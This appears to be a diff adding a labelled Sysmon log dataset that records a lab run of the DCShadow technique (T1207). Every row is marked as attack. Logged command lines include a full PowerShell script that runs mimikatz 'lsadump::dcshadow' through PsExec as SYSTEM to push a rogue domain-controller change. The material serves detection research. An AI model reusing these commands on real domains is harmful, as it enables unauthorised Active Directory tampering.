@@ -1,0 +1,109 @@
+UtcTime,Unnamed: 0,provider_guid,Provider,EventID,Version,Level,Task,Opcode,Keywords,TimeCreated,EventRecordID,Correlation,Execution,Channel,Computer,Security,RuleName,ProcessGuid,ProcessId,QueryName,QueryStatus,QueryResults,Image,User,FileVersion,Description,Product,Company,OriginalFileName,CommandLine,CurrentDirectory,LogonGuid,LogonId,TerminalSessionId,IntegrityLevel,Hashes,ParentProcessGuid,ParentProcessId,ParentImage,ParentCommandLine,ParentUser,EventType,TargetObject,Details,TargetFilename,CreationUtcTime,EventID_1,EventID_2,EventID_3,EventID_12,EventID_13,EventID_14,num_unique_IDs,is_attack
+2022-01-24 06:18:27,8,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,22,5,4,22,0,0x8000000000000000,,2304,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{00000000-0000-0000-0000-000000000000},4880,,,,<unknown process>,DOMAIN-1\Administrator,10.0.20348.1 (WinBuild.160101.0800),whoami - displays logged on user information,Microsoft® Windows® Operating System,Microsoft Corporation,whoami.exe,"""C:\Windows\system32\whoami.exe""",C:\Users\Administrator\,{aeb73b99-6d94-61ed-5515-040000000000},0x41555,1.0,High,"MD5=F0A0791523F2F55790337C5E401F27A1,SHA256=A703FCBC2159F86FD6F7BDFDCB6140042EECE715B108DE843575B5D688ADFBF5,IMPHASH=62935820E434AF643547B7F5F5BD0292",{00000000-0000-0000-0000-000000000000},4472.0,-,-,-,,,,,,0,0,0,0,0,0,1,True
+2022-01-24 06:18:27,5,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,22,5,4,22,0,0x8000000000000000,,2307,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{00000000-0000-0000-0000-000000000000},4268,_ldap._tcp.Default-First-Site-Name._sites.PC-1.DOMAIN-1.local.,9003.0,-,<unknown process>,NT AUTHORITY\SYSTEM,14.10.25028.0 built by: VCTOOLSD15RTM,Microsoft® Resource File To COFF Object Conversion Utility,Microsoft® .NET Framework,Microsoft Corporation,CVTRES.EXE,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES54BC.tmp"" ""c:\Users\Administrator\AppData\Local\Temp\qrdeafc4\CSC64BEF0CA865E4EBE9A6773EC8F93A7.TMP""",C:\Users\Administrator\AppData\Local\Temp\,{aeb73b99-6d94-61ed-5515-040000000000},0x41555,1.0,High,"MD5=C877CBB966EA5939AA2A17B6A5160950,SHA256=1FE531EAC592B480AA4BD16052B909C3431434F17E7AE163D248355558CE43A6,IMPHASH=55D76ADE7FFEA0F41FF2B55505C2B362",{aeb73b99-03bd-61ef-4004-000000000500},1484.0,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\Administrator\AppData\Local\Temp\qrdeafc4\qrdeafc4.cmdline""",DOMAIN-1\Administrator,,,,,,0,0,0,0,0,0,2,True
+2022-01-24 06:18:27,6,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,22,5,4,22,0,0x8000000000000000,,2306,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{00000000-0000-0000-0000-000000000000},4268,PC-1,0.0,192.168.211.128;,<unknown process>,NT AUTHORITY\SYSTEM,4.8.4161.0 built by: NET48REL1,Visual C# Command Line Compiler,Microsoft® .NET Framework,Microsoft Corporation,csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\Administrator\AppData\Local\Temp\qrdeafc4\qrdeafc4.cmdline""",C:\Users\Administrator\AppData\Local\Temp\,{aeb73b99-6d94-61ed-5515-040000000000},0x41555,1.0,High,"MD5=C7E54B9571F63873FE3539F4AA13FD9A,SHA256=ADEDA78A951529462F9411E016C1A1B87DDFD94C55912CBD2957817F39929AF1,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D",{aeb73b99-03bc-61ef-3f04-000000000500},6324.0,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" & {# starting fake DC server, as SYSTEM (required)
+$dc_output_file = \""""$env:TEMP\art-T1207-mimikatz-DC.log\""""
+Remove-Item $dc_output_file -ErrorAction Ignore
+$mimikatzParam =\""""`\""""log $dc_output_file`\"""" `\""""lsadump::dcshadow /object:PC-2.DOMAIN-1.local$ /attribute:badpwdcount /value:9999`\"""" `\""""exit`\""""\""""
+$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \""""/c C:\PSTools\PsExec.exe /accepteula -d -s C:\Users\Administrator\Downloads\mimikatz_trunk\x64\mimikatz.exe $mimikatzParam\""""
+
+# wait for fake DC server to be ready...
+Start-Sleep -Seconds 5
+
+# server ready, so trigger replication (push) and wait until it finished
+& C:\Users\Administrator\Downloads\mimikatz_trunk\x64\mimikatz.exe \""""lsadump::dcshadow /push\"""" \""""exit\""""
+
+Write-Host \""""`nWaiting for fake DC server to return\""""
+Wait-Process $dc
+
+Write-Host \""""`nOutput from fake DC server:\""""
+Get-Content $dc_output_file
+Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
+Remove-Item $dc_output_file -ErrorAction Ignore
+
+Write-Host \""""End of DCShadow\""""}",DOMAIN-1\Administrator,,,,,,0,0,0,0,0,0,2,True
+2022-01-24 06:18:27,7,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,22,5,4,22,0,0x8000000000000000,,2305,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{00000000-0000-0000-0000-000000000000},4268,,,,<unknown process>,NT AUTHORITY\SYSTEM,10.0.20348.1 (WinBuild.160101.0800),Windows PowerShell,Microsoft® Windows® Operating System,Microsoft Corporation,PowerShell.EXE,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" & {# starting fake DC server, as SYSTEM (required)
+$dc_output_file = \""""$env:TEMP\art-T1207-mimikatz-DC.log\""""
+Remove-Item $dc_output_file -ErrorAction Ignore
+$mimikatzParam =\""""`\""""log $dc_output_file`\"""" `\""""lsadump::dcshadow /object:PC-2.DOMAIN-1.local$ /attribute:badpwdcount /value:9999`\"""" `\""""exit`\""""\""""
+$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \""""/c C:\PSTools\PsExec.exe /accepteula -d -s C:\Users\Administrator\Downloads\mimikatz_trunk\x64\mimikatz.exe $mimikatzParam\""""
+
+# wait for fake DC server to be ready...
+Start-Sleep -Seconds 5
+
+# server ready, so trigger replication (push) and wait until it finished
+& C:\Users\Administrator\Downloads\mimikatz_trunk\x64\mimikatz.exe \""""lsadump::dcshadow /push\"""" \""""exit\""""
+
+Write-Host \""""`nWaiting for fake DC server to return\""""
+Wait-Process $dc
+
+Write-Host \""""`nOutput from fake DC server:\""""
+Get-Content $dc_output_file
+Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
+Remove-Item $dc_output_file -ErrorAction Ignore
+
+Write-Host \""""End of DCShadow\""""}",C:\Users\ADMINI~1\AppData\Local\Temp\,{aeb73b99-6d94-61ed-5515-040000000000},0x41555,1.0,High,"MD5=2E0CCB27064856E3D55017FA2D33A7B9,SHA256=1C84C8632C5269F24876ED9F49FA810B49F77E1E92E8918FC164C34B020F9A94,IMPHASH=BF7A6E7A62C3F5B2E8E069438AC1DD3D",{00000000-0000-0000-0000-000000000000},4472.0,-,-,-,,,,,,0,0,0,0,0,0,2,True
+2022-01-24 06:18:32,0,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,22,5,4,22,0,0x8000000000000000,,2312,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{00000000-0000-0000-0000-000000000000},5064,PC-1.DOMAIN-1.local,0.0,fe80::18d0:c22d:c938:42e3;::ffff:192.168.211.128;,<unknown process>,DOMAIN-1\Administrator,2.2.0.0,mimikatz for Windows,mimikatz,gentilkiwi (Benjamin DELPY),mimikatz.exe,"""C:\Users\Administrator\Downloads\mimikatz_trunk\x64\mimikatz.exe"" ""lsadump::dcshadow /push"" exit",C:\Users\Administrator\AppData\Local\Temp\,{aeb73b99-6d94-61ed-5515-040000000000},0x41555,1.0,High,"MD5=BB8BDB3E8C92E97E2F63626BC3B254C4,SHA256=912018AB3C6B16B39EE84F17745FF0C80A33CEE241013EC35D0281E40C0658D9,IMPHASH=9528A0E91E28FBB88AD433FEABCA2456",{aeb73b99-03bc-61ef-3f04-000000000500},6324.0,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" & {# starting fake DC server, as SYSTEM (required)
+$dc_output_file = \""""$env:TEMP\art-T1207-mimikatz-DC.log\""""
+Remove-Item $dc_output_file -ErrorAction Ignore
+$mimikatzParam =\""""`\""""log $dc_output_file`\"""" `\""""lsadump::dcshadow /object:PC-2.DOMAIN-1.local$ /attribute:badpwdcount /value:9999`\"""" `\""""exit`\""""\""""
+$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \""""/c C:\PSTools\PsExec.exe /accepteula -d -s C:\Users\Administrator\Downloads\mimikatz_trunk\x64\mimikatz.exe $mimikatzParam\""""
+
+# wait for fake DC server to be ready...
+Start-Sleep -Seconds 5
+
+# server ready, so trigger replication (push) and wait until it finished
+& C:\Users\Administrator\Downloads\mimikatz_trunk\x64\mimikatz.exe \""""lsadump::dcshadow /push\"""" \""""exit\""""
+
+Write-Host \""""`nWaiting for fake DC server to return\""""
+Wait-Process $dc
+
+Write-Host \""""`nOutput from fake DC server:\""""
+Get-Content $dc_output_file
+Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
+Remove-Item $dc_output_file -ErrorAction Ignore
+
+Write-Host \""""End of DCShadow\""""}",DOMAIN-1\Administrator,SetValue,HKLM\System\CurrentControlSet\Services\PSEXESVC\Start,DWORD (0x00000004),C:\Windows\PSEXESVC.exe,2022-01-24 19:53:34.277,0,0,0,0,0,0,3,True
+2022-01-24 06:18:32,1,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,22,5,4,22,0,0x8000000000000000,,2311,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{00000000-0000-0000-0000-000000000000},5064,_ldap._tcp.PC-1.DOMAIN-1.local.,9003.0,-,<unknown process>,DOMAIN-1\Administrator,2.2.0.0,mimikatz for Windows,mimikatz,gentilkiwi (Benjamin DELPY),mimikatz.exe,"""C:\Users\Administrator\Downloads\mimikatz_trunk\x64\mimikatz.exe"" ""log C:\Users\ADMINI~1\AppData\Local\Temp\art-T1207-mimikatz-DC.log"" ""lsadump::dcshadow /object:PC-2.DOMAIN-1.local$ /attribute:badpwdcount /value:9999"" ""exit""",C:\Windows\system32\,{aeb73b99-6d59-61ed-e703-000000000000},0x3e7,0.0,System,"MD5=BB8BDB3E8C92E97E2F63626BC3B254C4,SHA256=912018AB3C6B16B39EE84F17745FF0C80A33CEE241013EC35D0281E40C0658D9,IMPHASH=9528A0E91E28FBB88AD433FEABCA2456",{aeb73b99-03be-61ef-4504-000000000500},6908.0,C:\Windows\PSEXESVC.exe,C:\Windows\PSEXESVC.exe,NT AUTHORITY\SYSTEM,SetValue,HKLM\System\CurrentControlSet\Services\PSEXESVC\ImagePath,%%SystemRoot%%\PSEXESVC.exe,C:\Users\Administrator\AppData\Local\Temp\qrdeafc4\qrdeafc4.dll,2022-01-24 19:53:33.764,0,0,0,0,0,0,2,True
+2022-01-24 06:18:32,2,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,22,5,4,22,0,0x8000000000000000,,2310,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{00000000-0000-0000-0000-000000000000},5064,_ldap._tcp.Default-First-Site-Name._sites.PC-1.DOMAIN-1.local.,9003.0,-,<unknown process>,DOMAIN-1\Administrator,2.34,PsExec Service,Sysinternals PsExec,Sysinternals,psexesvc.exe,C:\Windows\PSEXESVC.exe,C:\Windows\system32\,{aeb73b99-6d59-61ed-e703-000000000000},0x3e7,0.0,System,"MD5=7DAE150C1DF0E01467BE3A743775B646,SHA256=3C19FEE379B4882971834A3D38F3F8B86DE560114274375560433778CD505748,IMPHASH=C6F15D8489EFC66B5F78AE26E48E691A",{aeb73b99-6d59-61ed-0b00-000000000500},636.0,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,SetValue,HKLM\System\CurrentControlSet\Services\PSEXESVC\Start,DWORD (0x00000003),C:\Users\Administrator\AppData\Local\Temp\qrdeafc4\qrdeafc4.cmdline,2022-01-24 19:53:33.764,0,0,0,0,0,0,2,True
+2022-01-24 19:53:17,26,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,1,5,4,1,0,0x8000000000000000,,2286,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{aeb73b99-03ad-61ef-3e04-000000000500},6864,,,,C:\Windows\System32\whoami.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,,1,0,0,0,0,0,3,True
+2022-01-24 19:53:17,27,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,1,5,4,1,0,0x8000000000000000,,2285,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{aeb73b99-03ad-61ef-3d04-000000000500},4816,,,,C:\Windows\System32\HOSTNAME.EXE,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,,1,0,0,0,0,0,3,True
+2022-01-24 19:53:32,25,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,1,5,4,1,0,0x8000000000000000,,2287,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{aeb73b99-03bc-61ef-3f04-000000000500},6324,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,,1,0,0,0,0,0,4,True
+2022-01-24 19:53:33,24,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,11,2,4,11,0,0x8000000000000000,,2288,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{aeb73b99-03bc-61ef-3f04-000000000500},6324,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,,1,0,0,0,0,0,4,True
+2022-01-24 19:53:33,23,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,11,2,4,11,0,0x8000000000000000,,2289,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,DLL,{aeb73b99-03bc-61ef-3f04-000000000500},6324,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,,1,0,0,0,0,0,3,True
+2022-01-24 19:53:33,22,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,11,2,4,11,0,0x8000000000000000,,2290,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{aeb73b99-03bc-61ef-3f04-000000000500},6324,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,,1,0,0,0,0,0,2,True
+2022-01-24 19:53:33,21,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,1,5,4,1,0,0x8000000000000000,,2291,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{aeb73b99-03bd-61ef-4004-000000000500},1484,,,,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,,1,0,0,0,0,0,2,True
+2022-01-24 19:53:33,20,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,1,5,4,1,0,0x8000000000000000,,2292,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{aeb73b99-03bd-61ef-4104-000000000500},3528,,,,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,,1,0,0,0,0,0,3,True
+2022-01-24 19:53:33,19,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,11,2,4,11,0,0x8000000000000000,,2293,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,DLL,{aeb73b99-03bd-61ef-4004-000000000500},1484,,,,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,,1,0,0,0,0,0,3,True
+2022-01-24 19:53:34,9,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,5,3,4,5,0,0x8000000000000000,,2303,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{aeb73b99-03be-61ef-4604-000000000500},4268,,,,C:\Users\Administrator\Downloads\mimikatz_trunk\x64\mimikatz.exe,NT AUTHORITY\SYSTEM,10.0.20348.1 (WinBuild.160101.0800),Hostname APP,Microsoft® Windows® Operating System,Microsoft Corporation,hostname.exe,"""C:\Windows\system32\HOSTNAME.EXE""",C:\Users\Administrator\,{aeb73b99-6d94-61ed-5515-040000000000},0x41555,1.0,High,"MD5=617440E733CEE06B4A0CAAB8F57556F6,SHA256=72261AF9305CD08E78FCFC6F083B2E057BFD73B8A423DA2FADC5A6A02A897340,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB",{00000000-0000-0000-0000-000000000000},4472.0,-,-,-,,,,,,1,0,0,0,0,0,4,True
+2022-01-24 19:53:34,18,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,1,5,4,1,0,0x8000000000000000,,2294,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{aeb73b99-03be-61ef-4204-000000000500},4332,,,,C:\Windows\System32\cmd.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,,1,0,0,0,0,0,4,True
+2022-01-24 19:53:34,16,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,13,2,4,13,0,0x8000000000000000,,2296,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,"Alert,Sysinternals Tool Used",{aeb73b99-03be-61ef-4404-000000000500},4880,,,,C:\PSTools\PsExec.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,,1,0,0,0,1,0,5,True
+2022-01-24 19:53:34,15,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,11,2,4,11,0,0x8000000000000000,,2297,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,EXE,{aeb73b99-03be-61ef-4404-000000000500},4880,,,,C:\PSTools\PsExec.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,,1,0,0,0,1,0,4,True
+2022-01-24 19:53:34,14,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,13,2,4,13,0,0x8000000000000000,,2298,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,"T1031,T1050",{aeb73b99-6d59-61ed-0b00-000000000500},636,,,,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,,,,1,0,0,0,1,0,4,True
+2022-01-24 19:53:34,12,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,1,5,4,1,0,0x8000000000000000,,2300,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{aeb73b99-03be-61ef-4504-000000000500},6908,,,,C:\Windows\PSEXESVC.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,,,,1,0,0,0,1,0,4,True
+2022-01-24 19:53:34,11,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,1,5,4,1,0,0x8000000000000000,,2301,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{aeb73b99-03be-61ef-4604-000000000500},4268,,,,C:\Users\Administrator\Downloads\mimikatz_trunk\x64\mimikatz.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,,,,1,0,0,0,1,0,4,True
+2022-01-24 19:53:34,10,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,13,2,4,13,0,0x8000000000000000,,2302,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,"T1031,T1050",{aeb73b99-6d59-61ed-0b00-000000000500},636,,,,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,,,,1,0,0,0,1,0,4,True
+2022-01-24 19:53:34,17,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,1,5,4,1,0,0x8000000000000000,,2295,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{aeb73b99-03be-61ef-4404-000000000500},4880,,,,C:\PSTools\PsExec.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,,1,0,0,0,1,0,4,True
+2022-01-24 19:53:34,13,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,13,2,4,13,0,0x8000000000000000,,2299,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,"T1031,T1050",{aeb73b99-6d59-61ed-0b00-000000000500},636,,,,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,,,,1,0,0,0,1,0,4,True
+2022-01-24 19:53:39,4,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,1,5,4,1,0,0x8000000000000000,,2308,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{aeb73b99-03c3-61ef-4804-000000000500},5064,_ldap._tcp.PC-1.DOMAIN-1.local.,9003.0,-,C:\Users\Administrator\Downloads\mimikatz_trunk\x64\mimikatz.exe,DOMAIN-1\Administrator,10.0.20348.1 (WinBuild.160101.0800),Windows Command Processor,Microsoft® Windows® Operating System,Microsoft Corporation,Cmd.Exe,"""C:\Windows\system32\cmd.exe"" /c C:\PSTools\PsExec.exe /accepteula -d -s C:\Users\Administrator\Downloads\mimikatz_trunk\x64\mimikatz.exe ""log C:\Users\ADMINI~1\AppData\Local\Temp\art-T1207-mimikatz-DC.log"" ""lsadump::dcshadow /object:PC-2.DOMAIN-1.local$ /attribute:badpwdcount /value:9999"" ""exit""",C:\Users\Administrator\AppData\Local\Temp\,{aeb73b99-6d94-61ed-5515-040000000000},0x41555,1.0,High,"MD5=E7A6B1F51EFB405287A8048CFA4690F4,SHA256=EB71EA69DD19F728AB9240565E8C7EFB59821E19E3788E289301E1E74940C208,IMPHASH=D60B77062898DC6BFAE7FE11A0F8806C",{aeb73b99-03bc-61ef-3f04-000000000500},6324.0,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" & {# starting fake DC server, as SYSTEM (required)
+$dc_output_file = \""""$env:TEMP\art-T1207-mimikatz-DC.log\""""
+Remove-Item $dc_output_file -ErrorAction Ignore
+$mimikatzParam =\""""`\""""log $dc_output_file`\"""" `\""""lsadump::dcshadow /object:PC-2.DOMAIN-1.local$ /attribute:badpwdcount /value:9999`\"""" `\""""exit`\""""\""""
+$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \""""/c C:\PSTools\PsExec.exe /accepteula -d -s C:\Users\Administrator\Downloads\mimikatz_trunk\x64\mimikatz.exe $mimikatzParam\""""
+
+# wait for fake DC server to be ready...
+Start-Sleep -Seconds 5
+
+# server ready, so trigger replication (push) and wait until it finished
+& C:\Users\Administrator\Downloads\mimikatz_trunk\x64\mimikatz.exe \""""lsadump::dcshadow /push\"""" \""""exit\""""
+
+Write-Host \""""`nWaiting for fake DC server to return\""""
+Wait-Process $dc
+
+Write-Host \""""`nOutput from fake DC server:\""""
+Get-Content $dc_output_file
+Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
+Remove-Item $dc_output_file -ErrorAction Ignore
+
+Write-Host \""""End of DCShadow\""""}",DOMAIN-1\Administrator,,,,C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_wia1osyl.efe.ps1,2022-01-24 19:53:33.167,1,0,0,0,1,0,4,True
+2022-01-24 19:53:39,3,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,5,3,4,5,0,0x8000000000000000,,2309,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,{aeb73b99-03c3-61ef-4804-000000000500},5064,PC-1.DOMAIN-1.local,0.0,fe80::18d0:c22d:c938:42e3;::ffff:192.168.211.128;,C:\Users\Administrator\Downloads\mimikatz_trunk\x64\mimikatz.exe,DOMAIN-1\Administrator,2.34,Execute processes remotely,Sysinternals PsExec,Sysinternals - www.sysinternals.com,psexec.c,"C:\PSTools\PsExec.exe  /accepteula -d -s C:\Users\Administrator\Downloads\mimikatz_trunk\x64\mimikatz.exe ""log C:\Users\ADMINI~1\AppData\Local\Temp\art-T1207-mimikatz-DC.log"" ""lsadump::dcshadow /object:PC-2.DOMAIN-1.local$ /attribute:badpwdcount /value:9999"" ""exit""",C:\Users\Administrator\AppData\Local\Temp\,{aeb73b99-6d94-61ed-5515-040000000000},0x41555,1.0,High,"MD5=C590A84B8C72CF18F35AE166F815C9DF,SHA256=57492D33B7C0755BB411B22D2DFDFDF088CBBFCD010E30DD8D425D5FE66ADFF4,IMPHASH=3A7027A9D54E3A7C74FB919CA7B1C544",{aeb73b99-03be-61ef-4204-000000000500},4332.0,C:\Windows\System32\cmd.exe,"""C:\Windows\system32\cmd.exe"" /c C:\PSTools\PsExec.exe /accepteula -d -s C:\Users\Administrator\Downloads\mimikatz_trunk\x64\mimikatz.exe ""log C:\Users\ADMINI~1\AppData\Local\Temp\art-T1207-mimikatz-DC.log"" ""lsadump::dcshadow /object:PC-2.DOMAIN-1.local$ /attribute:badpwdcount /value:9999"" ""exit""",DOMAIN-1\Administrator,SetValue,HKU\S-1-5-21-1570325482-1833380856-280552818-500\Software\Sysinternals\PsExec\EulaAccepted,DWORD (0x00000001),C:\Users\Administrator\AppData\Local\Temp\qrdeafc4\qrdeafc4.dll,2022-01-24 19:53:33.764,1,0,0,0,1,0,3,True
